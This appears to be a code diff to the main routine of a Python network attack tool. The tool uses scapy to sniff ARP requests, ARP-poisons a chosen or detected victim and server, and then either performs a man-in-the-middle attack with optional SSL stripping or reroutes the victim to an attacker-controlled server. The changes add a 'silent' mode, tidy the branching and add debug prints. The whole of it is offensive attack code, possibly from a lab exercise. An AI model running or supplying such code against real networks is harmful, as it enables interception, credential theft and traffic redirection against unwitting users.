@@ -20,6 +20,7 @@ def main():
         goal = ""
         sslStrip = ""
         ownServerIp = ""
+        silent = ""
         while (ipt != "scan" and  ipt != "arp" and ipt != "quit"):
             if (ipt != ""):
                 print("Invalid input, please try again")
@@ -44,10 +45,10 @@ def main():
                     print("Invalid input, please try again")
                 silent = input("Enter 'silent' or 'allOut': ").strip().lower()
 
-            while (goal != "mitm" and goal != "ownServer"):
+            while (goal != "mitm" and goal != "ownserver"):
                 if (goal != ""):
                     print("Invalid input, please try again") 
-                goal = input("Enter a goal: 'mitm' or 'ownServer': ").strip().lower()
+                goal = input("Enter a goal: 'mitm' or 'ownserver': ").strip().lower()
             ownServerMac = ""
 
 
@@ -57,6 +58,8 @@ def main():
                         print("Invalid input, please try again")                    
                     ownServerIp = input("Enter a ip adress to reroute victim to: ").strip().lower()
                 ownServerMac = get_mac(ownServerIp)
+                print(ownServerIp)
+                print(ownServerMac)
                     
             elif goal == "mitm":
                 while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
@@ -67,6 +70,7 @@ def main():
             if len(parts) == 2:
                 victim_ip = parts[0] if parts[0] != "none" else None
                 server_ip = parts[1] if parts[1] != "none" else None
+                print("len part", victim_ip, " server: ",server_ip)
 
                 if (victim_ip is not None and server_ip is None):
                     pkt =  sc.sniff(filter="arp", store=0)
@@ -74,20 +78,19 @@ def main():
                     if pkt.haslayer(sc.ARP):
                         arp = pkt[sc.ARP]
                         if arp.op == 1 and arp.psrc == victim_ip:
-                            serverMac, victimMac = ArpPoisen.arp_poisoning(victim_ip, arp.pdst)
+                            serverMac, victimMac = ArpPoisen.arp_poisoning(victim_ip, arp.pdst, silent)
                             
                 
-                if (victim_ip is None and server_ip is None):
+                elif (victim_ip is None and server_ip is None):
                     pkt =  sc.sniff(filter="arp", store=0)
                     if pkt.haslayer(sc.ARP):
                         arp = pkt[sc.ARP]
                         if arp.op == 1:
-                            serverMac, victimMac = ArpPoisen.arp_poisoning(arp.psrc, arp.pdst)
-                	
-                print(f"Victim IP: {victim_ip}")
-                print(f"Server IP: {server_ip}")
+                            serverMac, victimMac = ArpPoisen.arp_poisoning(arp.psrc, arp.pdst, silent)
 
-                serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP)
+                else:
+                    print("else option", victim_ip, server_ip, silent)
+                    serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
 
                 if goal == "ownserver":
                     sslStripping.forward(victim_ip, victimMac, ownServerIp, ownServerMac, attackerIP, attackerMac)
